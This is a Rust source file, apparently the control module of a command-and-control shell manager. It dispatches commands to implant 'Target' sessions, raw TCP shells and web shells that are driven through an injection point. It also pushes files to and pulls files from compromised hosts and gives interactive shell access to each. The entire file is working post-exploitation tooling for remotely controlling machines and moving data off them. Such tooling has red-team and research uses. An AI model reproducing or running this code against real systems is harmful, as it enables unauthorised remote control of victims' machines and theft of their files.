use std::io::{BufRead, BufReader, Read, Write};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use anyhow::Result;
use serde_json::json;
use tokio::io::AsyncWriteExt;
use tokio::sync::Mutex;

use sha2::Digest;
use base64::Engine;
use crate::target::protocol;
use crate::{Command, Response};
use crate::server_module::sessions::*;
use crate::server_module::web;

async fn read_from_buf(buf: &Mutex<Vec<u8>>, timeout: f64) -> String {
    let mut b = buf.lock().await;
    if b.is_empty() && timeout > 0.0 {
        drop(b);
        tokio::time::sleep(Duration::from_secs_f64(timeout.min(2.0))).await;
        let mut b = buf.lock().await;
        let output = String::from_utf8_lossy(&b).to_string(); b.clear(); output
    } else { let output = String::from_utf8_lossy(&b).to_string(); b.clear(); output }
}

fn hex_encode(bytes: &[u8]) -> String {
    const HEX: &[u8] = b"0123456789abcdef";
    let mut out = Vec::with_capacity(bytes.len() * 2);
    for &b in bytes { out.push(HEX[(b >> 4) as usize]); out.push(HEX[(b & 0x0f) as usize]); }
    unsafe { String::from_utf8_unchecked(out) }
}

#[derive(serde::Deserialize)]
struct PushCommand { path: String, size: u64, #[serde(default = "def_timeout")] timeout: Option<f64> }

#[derive(serde::Deserialize)]
struct PullCommand { path: String, #[serde(default = "def_timeout")] timeout: Option<f64> }

fn def_timeout() -> Option<f64> { Some(30.0) }

macro_rules! respond {
    ($stream:expr, $resp:expr) => {{
        let j = serde_json::to_string(&$resp)? + "\n";
        $stream.write_all(j.as_bytes())?;
    }};
}

pub async fn handle_control(tokio_stream: tokio::net::UnixStream, manager: Arc<Mutex<SessionManager>>) -> Result<()> {
    let mut stream: std::os::unix::net::UnixStream = tokio_stream.into_std()?;
    stream.set_nonblocking(false)?;
    stream.set_read_timeout(Some(Duration::from_secs(5)))?;

    let mut buf_reader = BufReader::new(&stream);
    let mut line = String::new();
    buf_reader.read_line(&mut line)?;
    if line.is_empty() { return Ok(()); }

    let cmd: Command = serde_json::from_str(line.trim())?;
    let action = &cmd.action;

    // Extract any buffered data from the BufReader (for push)
    let push_buffered = buf_reader.buffer().to_vec();
    drop(buf_reader);

    match action.as_str() {
        "list" => {
            let mg = manager.lock().await;
            respond!(stream, Response::with_shells(json!(mg.list())));
        }
        "send" => send_handler(cmd, &manager, &mut stream).await?,
        "read" => read_handler(cmd, &manager, &mut stream).await?,
        "push" => push_handler(cmd, &manager, &mut stream, push_buffered).await?,
        "pull" => pull_handler(cmd, &manager, &mut stream).await?,
        "close" => { let mut mg = manager.lock().await; mg.remove(cmd.id.unwrap_or(0)); respond!(stream, Response::ok()); }
        #[cfg(feature = "web")]
        "register_web" => {
            let config: crate::WebShellConfig = match serde_json::from_str(&cmd.data.unwrap_or_default()) {
                Ok(c) => c, Err(e) => { respond!(stream, Response::error(format!("Invalid config: {}", e))); return Ok(()); }
            };
            let id = { let mut mg = manager.lock().await; mg.add_web(config) };
            respond!(stream, Response::with_shells(json!({"id": id})));
        }
        "interact" => interact_handler(cmd, &manager, &mut stream).await?,
        _ => respond!(stream, Response::error(format!("Unknown action: {}", action))),
    }
    Ok(())
}

// ── Shared cd handler (real exec on target) ────────────────────────────────

async fn exec_cd(
    writer: &Arc<Mutex<tokio::net::tcp::OwnedWriteHalf>>,
    shared: &Arc<TargetShared>,
    dir: &str,
    timeout: f64,
) -> (String, bool) {
    let actual_cmd = format!("cd {} && pwd 2>&1", dir);
    let cmd_id = uuid::Uuid::new_v4().to_string();
    let wd = { let c = shared.cwd.lock().await; if c.is_empty() { None } else { Some(c.clone()) } };
    let req = if let Some(ref w) = wd { protocol::ExecRequest::with_workdir(cmd_id.clone(), actual_cmd, w.clone()) } else { protocol::ExecRequest::new(cmd_id.clone(), actual_cmd) };
    { let mut cs = shared.cmd_state.lock().await; *cs = Some(TargetCmdState { cmd_id: cmd_id.clone(), output_buf: vec![], completed: false, exit_code: None }); }
    let mut j = match serde_json::to_string(&req) { Ok(s) => s, Err(_) => return ("serialize error".into(), false) };
    j.push('\n');
    { let mut w = writer.lock().await; let _ = w.write_all(j.as_bytes()).await; }
    for _ in 0..(timeout * 10.0).ceil() as u32 {
        tokio::time::sleep(Duration::from_millis(100)).await;
        let (done, out, code) = { let s = shared.cmd_state.lock().await; if let Some(ref st) = *s { (st.completed, st.output_buf.clone(), st.exit_code) } else { (false, vec![], None) } };
        if done {
            let o = String::from_utf8_lossy(&out).trim().to_string();
            if let Some(c) = code {
                if c == 0 {
                    if o.starts_with('/') {
                        let mut cwd = shared.cwd.lock().await;
                        *cwd = o.clone();
                    }
                    return (format!("[cwd: {}]", { let c = shared.cwd.lock().await; c.clone() }), true);
                } else {
                    return (o, false);
                }
            }
        }
    }
    ("cd timeout".into(), false)
}

async fn send_handler(cmd: Command, manager: &Arc<Mutex<SessionManager>>, stream: &mut std::os::unix::net::UnixStream) -> Result<()> {
    let id = cmd.id.unwrap_or(0);
    let command = cmd.data.unwrap_or_default().trim().to_string();
    let wait = cmd.wait.unwrap_or(false);
    let timeout = cmd.timeout.unwrap_or(3.0);

    // Target
    if let Some((writer, shared, alive)) = {
        let mg = manager.lock().await;
        match mg.sessions.get(&id) {
            Some(ManagedSession::Target(s)) => Some((Arc::clone(&s.writer), Arc::clone(&s.shared), s.shared.alive.load(Ordering::SeqCst))),
            _ => None,
        }
    } {
        if !alive { respond!(stream, Response::error("Target dead")); return Ok(()); }

        // Real cd: execute on target, update cwd only on success
        if let Some(dir) = command.trim().strip_prefix("cd ") {
            let (output, ok) = exec_cd(&writer, &shared, dir.trim(), timeout).await;
            if ok { respond!(stream, Response::with_output(format!("{}\n", output))); }
            else { respond!(stream, Response::with_output_exit(output, 1)); }
            return Ok(());
        }
        let cmd_id = uuid::Uuid::new_v4().to_string();
        let wd = { let c = shared.cwd.lock().await; if c.is_empty() { None } else { Some(c.clone()) } };
        let req = if let Some(ref w) = wd { protocol::ExecRequest::with_workdir(cmd_id.clone(), command, w.clone()) } else { protocol::ExecRequest::new(cmd_id.clone(), command) };
        { let mut cs = shared.cmd_state.lock().await; *cs = Some(TargetCmdState { cmd_id: cmd_id.clone(), output_buf: vec![], completed: false, exit_code: None }); }
        let mut j = serde_json::to_string(&req)?; j.push('\n');
        { let mut w = writer.lock().await; let _ = w.write_all(j.as_bytes()).await; }
        if wait {
            for _ in 0..(timeout * 10.0).ceil() as u32 {
                tokio::time::sleep(Duration::from_millis(100)).await;
                let (done, out, code) = { let s = shared.cmd_state.lock().await; if let Some(ref st) = *s { (st.completed, st.output_buf.clone(), st.exit_code) } else { (false, vec![], None) } };
                if done { let o = String::from_utf8_lossy(&out).to_string(); match code { Some(c) => respond!(stream, Response::with_output_exit(o, c)), None => respond!(stream, Response::with_output(o)) } return Ok(()); }
            }
            respond!(stream, Response::error("Timeout"));
        } else { respond!(stream, Response::ok()); }
        return Ok(());
    }

    // TCP
    if let Some((writer, buf)) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Tcp(s, b)) => Some((Arc::clone(&s.writer), Arc::clone(b))), _ => None } } {
        let to_send = format!("{}\n", command);
        { let mut w = writer.lock().await; let _ = w.write_all(to_send.as_bytes()).await; }
        if wait { let output = read_from_buf(&buf, timeout).await; respond!(stream, Response::with_output(output)); } else { respond!(stream, Response::ok()); }
        return Ok(());
    }

    // Web
    #[cfg(feature = "web")]
    if let Some((config, buf)) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Web(s)) => Some((crate::WebShellConfig { url: s.url.clone(), injection_point: s.injection_point.clone(), method: s.method.clone(), body_template: s.body_template.clone(), headers: s.headers.clone(), cookie: s.cookie.clone() }, Arc::clone(&s.buf))), _ => None } } {
        match web::web_shell_exec(&config, &command).await {
            Ok(body) => { if wait { respond!(stream, Response::with_output(body)); } else { *buf.lock().await = body.into_bytes(); respond!(stream, Response::ok()); } }
            Err(e) => respond!(stream, Response::error(e.to_string())),
        }
        return Ok(());
    }

    respond!(stream, Response::error("Shell not found"));
    Ok(())
}

async fn read_handler(cmd: Command, manager: &Arc<Mutex<SessionManager>>, stream: &mut std::os::unix::net::UnixStream) -> Result<()> {
    let id = cmd.id.unwrap_or(0);
    let timeout = cmd.timeout.unwrap_or(0.2);
    // Target
    if let Some(out) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Target(s)) => { let mut cs = s.shared.cmd_state.lock().await; if let Some(ref mut st) = *cs { let o = String::from_utf8_lossy(&st.output_buf).to_string(); st.output_buf.clear(); Some(o) } else { None } } _ => None } } {
        respond!(stream, Response::with_output(out)); return Ok(());
    }
    // TCP
    if let Some(buf) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Tcp(_, b)) => Some(Arc::clone(b)), _ => None } } {
        respond!(stream, Response::with_output(read_from_buf(&buf, timeout).await)); return Ok(());
    }
    // Web
    #[cfg(feature = "web")]
    if let Some(buf) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Web(s)) => Some(Arc::clone(&s.buf)), _ => None } } {
        respond!(stream, Response::with_output(read_from_buf(&buf, timeout).await)); return Ok(());
    }
    respond!(stream, Response::error("Shell not found"));
    Ok(())
}

async fn push_handler(cmd: Command, manager: &Arc<Mutex<SessionManager>>, stream: &mut std::os::unix::net::UnixStream, buffered: Vec<u8>) -> Result<()> {
    let id = cmd.id.unwrap_or(0);
    let pc: PushCommand = match serde_json::from_str(&cmd.data.unwrap_or_default()) { Ok(p) => p, Err(e) => { respond!(stream, Response::error(format!("Invalid push: {}", e))); return Ok(()); } };
    let writer = match { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Target(s)) if s.shared.alive.load(Ordering::SeqCst) => Some(Arc::clone(&s.writer)), _ => None } } { Some(w) => w, None => { respond!(stream, Response::error("Target not found")); return Ok(()); } };

    let size = pc.size as usize;
    let mut data = Vec::with_capacity(size);
    let fb = buffered.len().min(size);
    if fb > 0 { data.extend_from_slice(&buffered[..fb]); }
    if size > fb {
        let mut raw = stream.try_clone()?; raw.set_read_timeout(Some(Duration::from_secs(30)))?;
        let mut rest = vec![0u8; size - fb]; raw.read_exact(&mut rest)?; data.extend_from_slice(&rest);
    }

    let mut h = sha2::Sha256::new(); h.update(&data); let srv_hash = hex_encode(&h.finalize());
    let (tx, rx) = tokio::sync::oneshot::channel();
    { let mg = manager.lock().await; if let Some(ManagedSession::Target(s)) = mg.sessions.get(&id) { *s.shared.push_channel.lock().await = Some(tx); } }

    let ps = protocol::PushStart::new(pc.path.clone(), pc.size, srv_hash.clone());
    let mut j = serde_json::to_string(&ps)?; j.push('\n');
    { let mut w = writer.lock().await; let _ = w.write_all(j.as_bytes()).await; }
    { let mut w = writer.lock().await; w.write_all(&data).await.map_err(|e| anyhow::anyhow!("write: {}", e))?; }

    match tokio::time::timeout(Duration::from_secs_f64(pc.timeout.unwrap_or(30.0)), rx).await {
        Ok(Ok((path, hash))) => {
            if hash.starts_with("error:") { respond!(stream, Response::error(&hash[6..])); }
            else if hash == srv_hash { respond!(stream, Response::with_output(format!("Pushed '{}' — hash verified (SHA-256: {})", path, hash))); }
            else { respond!(stream, Response::error(format!("Hash mismatch"))); }
        }
        Ok(Err(_)) => respond!(stream, Response::error("Push cancelled")),
        Err(_) => respond!(stream, Response::error("Push timeout")),
    }
    Ok(())
}

async fn pull_handler(cmd: Command, manager: &Arc<Mutex<SessionManager>>, stream: &mut std::os::unix::net::UnixStream) -> Result<()> {
    let id = cmd.id.unwrap_or(0);
    let pc: PullCommand = match serde_json::from_str(&cmd.data.unwrap_or_default()) { Ok(p) => p, Err(e) => { respond!(stream, Response::error(format!("Invalid pull: {}", e))); return Ok(()); } };
    let (writer, shared) = match { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Target(s)) if s.shared.alive.load(Ordering::SeqCst) => Some((Arc::clone(&s.writer), Arc::clone(&s.shared))), _ => None } } { Some(w) => w, None => { respond!(stream, Response::error("Target not found")); return Ok(()); } };

    let (tx, rx) = tokio::sync::oneshot::channel::<String>();
    *shared.pull_channel.lock().await = Some(tx);
    let pr = protocol::PullRequest::new(pc.path.clone());
    let mut j = serde_json::to_string(&pr)?; j.push('\n');
    { let mut w = writer.lock().await; let _ = w.write_all(j.as_bytes()).await; }

    match tokio::time::timeout(Duration::from_secs_f64(pc.timeout.unwrap_or(30.0)), rx).await {
        Ok(Ok(raw)) => {
            let msg: serde_json::Value = serde_json::from_str(&raw)?;
            if msg["type"] == "push_error" { respond!(stream, Response::error(format!("Pull failed: {}", msg["message"].as_str().unwrap_or("?")))); return Ok(()); }
            let size = msg["size"].as_u64().unwrap_or(0); let hash = msg["hash"].as_str().unwrap_or("").to_string();
            let b64 = msg["data"].as_str().unwrap_or("");
            let file_data = base64::engine::general_purpose::STANDARD.decode(b64)?;
            let mut h = sha2::Sha256::new(); h.update(&file_data);
            if hex_encode(&h.finalize()) != hash { respond!(stream, Response::error("Hash mismatch")); return Ok(()); }
            respond!(stream, Response::with_output(format!("Pulled '{}' ({} bytes, hash: {})", pc.path, size, hash)));
        }
        Ok(Err(_)) => respond!(stream, Response::error("Pull cancelled")),
        Err(_) => respond!(stream, Response::error("Pull timeout")),
    }
    Ok(())
}

async fn interact_handler(cmd: Command, manager: &Arc<Mutex<SessionManager>>, stream: &mut std::os::unix::net::UnixStream) -> Result<()> {
    use std::io::Read as _;
    let id = cmd.id.unwrap_or(0);
    macro_rules! r { ($e:expr) => {{ let j = serde_json::to_string(&$e)? + "\n"; stream.write_all(j.as_bytes())?; }}; }

    // TCP
    if let Some((sw, sb, alive)) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Tcp(s, b)) => Some((Arc::clone(&s.writer), Arc::clone(b), Arc::clone(&s.alive))), _ => None } } {
        r!(serde_json::json!({"status":"ok","message":"Entering interactive mode"}));
        stream.write_all(b"\r\n[+] Interactive mode. Press Ctrl+C to detach\r\n")?;
        let mut s2 = stream.try_clone()?; let done = Arc::new(AtomicBool::new(false)); let pc = Arc::new(AtomicBool::new(false));
        let b2 = Arc::clone(&sb); let a2 = Arc::clone(&alive); let d1 = Arc::clone(&done); let p1 = Arc::clone(&pc);
        std::thread::spawn(move || { let rt = tokio::runtime::Builder::new_current_thread().enable_time().build().unwrap(); rt.block_on(async move { loop { if d1.load(Ordering::SeqCst) || !a2.load(Ordering::SeqCst) || p1.load(Ordering::SeqCst) { break; } let mut b = b2.lock().await; if !b.is_empty() { let d = b.clone(); b.clear(); drop(b); if s2.write_all(&d).is_err() { p1.store(true, Ordering::SeqCst); break; } } else { drop(b); tokio::time::sleep(Duration::from_millis(50)).await; } } }); });
        let ws = Arc::clone(&sw); let d2 = Arc::clone(&done); let p2 = Arc::clone(&pc); let mut s3 = stream.try_clone()?;
        std::thread::spawn(move || { let rt = tokio::runtime::Builder::new_current_thread().enable_time().build().unwrap(); let _ = rt.block_on(async move { let mut buf = [0u8; 65536]; let _ = s3.set_read_timeout(Some(Duration::from_secs(1))); loop { if d2.load(Ordering::SeqCst) || p2.load(Ordering::SeqCst) { break; } match s3.read(&mut buf) { Ok(0) => { p2.store(true, Ordering::SeqCst); break; } Ok(n) => { let d = buf[..n].to_vec(); let mut w = ws.lock().await; let _ = w.write_all(&d).await; } Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock || e.kind() == std::io::ErrorKind::TimedOut => continue, Err(_) => { p2.store(true, Ordering::SeqCst); break; } } } Ok::<_, anyhow::Error>(()) }); });
        loop { tokio::time::sleep(Duration::from_millis(200)).await; if !alive.load(Ordering::SeqCst) || pc.load(Ordering::SeqCst) { break; } }
        done.store(true, Ordering::SeqCst); return Ok(());
    }

    // Target
    if let Some((tw, shared)) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Target(s)) => Some((Arc::clone(&s.writer), Arc::clone(&s.shared))), _ => None } } {
        r!(serde_json::json!({"status":"ok","message":"Entering target interactive mode"})); stream.flush()?;
        let done = Arc::new(AtomicBool::new(false)); let pc = Arc::new(AtomicBool::new(false));
        let mut si = stream.try_clone()?; let wt = Arc::clone(&tw); let sh = Arc::clone(&shared);
        let d1 = Arc::clone(&done); let p1 = Arc::clone(&pc);
        std::thread::spawn(move || {
            let mut tmp = [0u8; 65536]; let _ = si.set_read_timeout(Some(Duration::from_millis(500))); let mut lb = Vec::new();
            loop {
                if d1.load(Ordering::SeqCst) || p1.load(Ordering::SeqCst) { break; }
                match si.read(&mut tmp) { Ok(0) => { p1.store(true, Ordering::SeqCst); break; } Ok(n) => { let data = &tmp[..n]; if data.contains(&0x03) { break; } for &b in data { if b == b'\n' || b == b'\r' { if !lb.is_empty() { let cmd = String::from_utf8_lossy(&lb).trim().to_string(); if !cmd.is_empty() { if let Some(dir) = cmd.strip_prefix("cd ") { let d = dir.trim(); let rt = tokio::runtime::Builder::new_current_thread().enable_time().build().unwrap(); rt.block_on(async { let (output, _ok) = exec_cd(&wt, &sh, d, 5.0).await; let mut cs = sh.cmd_state.lock().await; *cs = Some(TargetCmdState { cmd_id: String::new(), output_buf: format!("{}
", output).into_bytes(), completed: true, exit_code: Some(if _ok { 0 } else { 1 }) }); }); } else { let rt = tokio::runtime::Builder::new_current_thread().enable_time().build().unwrap(); rt.block_on(async { let cid = uuid::Uuid::new_v4().to_string(); let wd = { let c = sh.cwd.lock().await; if c.is_empty() { None } else { Some(c.clone()) } }; let mut cs = sh.cmd_state.lock().await; *cs = Some(TargetCmdState { cmd_id: cid.clone(), output_buf: vec![], completed: false, exit_code: None }); drop(cs); let req = if let Some(ref w) = wd { protocol::ExecRequest::with_workdir(cid, cmd, w.clone()) } else { protocol::ExecRequest::new(cid, cmd) }; let mut j = serde_json::to_string(&req).unwrap_or_default(); j.push('\n'); let mut w = wt.lock().await; let _ = w.write_all(j.as_bytes()).await; }); } } lb.clear(); } } else if b >= 0x20 { lb.push(b); } } } Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock || e.kind() == std::io::ErrorKind::TimedOut => continue, Err(_) => { p1.store(true, Ordering::SeqCst); break; } }
            }
            d1.store(true, Ordering::SeqCst);
        });
        let mut so = stream.try_clone()?; let sh2 = Arc::clone(&shared);
        let d2 = Arc::clone(&done); let p2 = Arc::clone(&pc);
        std::thread::spawn(move || { let rt = tokio::runtime::Builder::new_current_thread().enable_time().build().unwrap(); rt.block_on(async move { loop { if d2.load(Ordering::SeqCst) || p2.load(Ordering::SeqCst) { break; } let (out, done, code) = { let mut cs = sh2.cmd_state.lock().await; if let Some(ref mut st) = *cs { let o = st.output_buf.clone(); st.output_buf.clear(); (o, st.completed, st.exit_code) } else { (vec![], false, None) } }; if done { { let mut cs = sh2.cmd_state.lock().await; *cs = None; } for c in out.chunks(4096) { let _ = so.write_all(c); } if !out.is_empty() && !out.ends_with(b"\n") { let _ = so.write_all(b"\n"); } if let Some(c) = code { let _ = so.write_all(format!("[exit code: {}]\n", c).as_bytes()); } let _ = so.flush(); } else if !out.is_empty() { let _ = so.write_all(&out); let _ = so.flush(); } tokio::time::sleep(Duration::from_millis(50)).await; } }); });
        loop { tokio::time::sleep(Duration::from_millis(200)).await; if done.load(Ordering::SeqCst) || pc.load(Ordering::SeqCst) { break; } }
        done.store(true, Ordering::SeqCst); return Ok(());
    }

    // Web
    #[cfg(feature = "web")]
    if let Some((config, _buf)) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Web(s)) => Some((crate::WebShellConfig { url: s.url.clone(), injection_point: s.injection_point.clone(), method: s.method.clone(), body_template: s.body_template.clone(), headers: s.headers.clone(), cookie: s.cookie.clone() }, Arc::clone(&s.buf))), _ => None } } {
        r!(serde_json::json!({"status":"ok","message":"Entering web shell interactive mode"}));
        stream.write_all(b"\r\n[+] Web shell interactive mode (Ctrl+C to detach)\r\n>> ")?; stream.flush()?;
        stream.set_read_timeout(Some(Duration::from_millis(100)))?;
        'outer: loop { let mut cb = Vec::new(); let mut tmp = [0u8; 65536]; 'rl: loop { match stream.read(&mut tmp) { Ok(0) => break 'outer, Ok(n) => { for &b in &tmp[..n] { if b == 0x03 { break 'outer; } if b == b'\n' { break 'rl; } cb.push(b); } } Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock || e.kind() == std::io::ErrorKind::TimedOut => continue, Err(_) => break 'outer, } }
        let cmd = String::from_utf8_lossy(&cb).trim().to_string(); if cmd.is_empty() { continue; }
        match web::web_shell_exec(&config, &cmd).await {
            Ok(body) => { stream.write_all(body.replace("\n", "\r\n").as_bytes())?; stream.write_all(b"\r\n>> ")?; stream.flush()?; }
            Err(e) => { let m = format!("\r\n[!] {}\r\n", e); stream.write_all(m.as_bytes())?; stream.flush()?; }
        } }
        return Ok(());
    }

    respond!(stream, Response::error("Shell not found"));
    Ok(())
}
